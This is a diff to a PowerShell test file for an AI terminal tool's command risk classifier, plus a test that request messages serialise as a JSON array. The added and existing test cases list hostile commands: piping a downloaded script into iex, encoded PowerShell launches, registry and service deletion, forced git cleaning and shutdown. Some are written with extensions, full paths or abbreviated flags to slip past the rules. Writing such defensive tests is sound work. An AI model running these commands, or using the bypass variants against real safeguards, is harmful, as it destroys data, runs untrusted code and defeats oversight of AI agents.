@@ -53,6 +53,13 @@ $riskCases = [ordered]@{
     'git clean -fdx' = 'High'; 'git reset --hard HEAD' = 'High'; 'Copy-Item a b -Force' = 'High'; 'reg delete HKCU\Software\X /f' = 'High'
     'iwr https://example.com/x.ps1 | iex' = 'High'; 'cmd /c dir' = 'High'; 'Start-Process notepad -Verb RunAs' = 'High'
     '[IO.File]::Delete(''x'')' = 'High'; '& $command' = 'High'; 'Get-ChildItem | Remove-Item' = 'High'; 'shutdown /s' = 'High'
+    # 带扩展名、完整路径、git 全局参数的写法不能绕过高风险规则。
+    'reg.exe delete HKCU\Software\X /f' = 'High'; 'sc.exe delete svc' = 'High'; 'git.exe clean -fdx' = 'High'
+    'git -C . clean -fdx' = 'High'; 'C:\Windows\System32\cmd.exe /c del x' = 'High'; '& "C:\Windows\System32\reg.exe" delete HKCU\X' = 'High'
+    # -Force 可以缩写；Start-Process 启动 shell 等同直接运行 shell。
+    'Copy-Item a b -f' = 'High'; 'Move-Item a b -Fo' = 'High'; 'Start-Process powershell -ArgumentList ''-enc AAAA''' = 'High'
+    'Start-Process -FilePath C:\Windows\System32\cmd.exe' = 'High'; 'Start-Process notepad' = 'Medium'
+    'git log --output=log.txt' = 'Medium'; 'git diff --output=diff.txt' = 'Medium'
 }
 foreach ($riskCase in $riskCases.GetEnumerator()) {
     Assert-Equal $riskCase.Value ([string][PSAITerminal.AITerminalSecurity]::ClassifyRisk($riskCase.Key)) "风险分级错误：$($riskCase.Key)"
@@ -84,6 +91,18 @@ $bodyRows = & $module {
     }
 }
 Assert-Equal 2 @($bodyRows | Where-Object HasTools).Count '两种协议都必须生成原生工具定义。'
+# 合并或截取后只剩一条消息时，messages 仍必须序列化为 JSON 数组。
+$singleMessageBodies = & $module {
+    foreach ($protocol in $script:ValidProtocols) {
+        $model = @{protocol=$protocol;modelId='model';parameters=@{}}
+        $messages = [Collections.Generic.List[object]]::new()
+        $messages.Add([ordered]@{role='user';content='任务'}); $messages.Add([ordered]@{role='tool';content='[工具结果] 输出'})
+        [pscustomobject]@{Protocol=$protocol;Json=(New-AIRequestBody $model -Messages $messages -EnableTools | ConvertTo-Json -Depth 50 -Compress)}
+    }
+}
+foreach ($singleMessageBody in $singleMessageBodies) {
+    Assert-Match $singleMessageBody.Json '"messages":\[' "$($singleMessageBody.Protocol) 的 messages 必须是 JSON 数组。"
+}
 Assert-Match ([string]($bodyRows | Where-Object Protocol -eq 'OpenAIChat').SystemText) 'Reply in English' '默认英文设置也必须要求模型使用英文回答。'
 $chineseSystemText = & $module {
     $previousLanguage = $script:Config.language
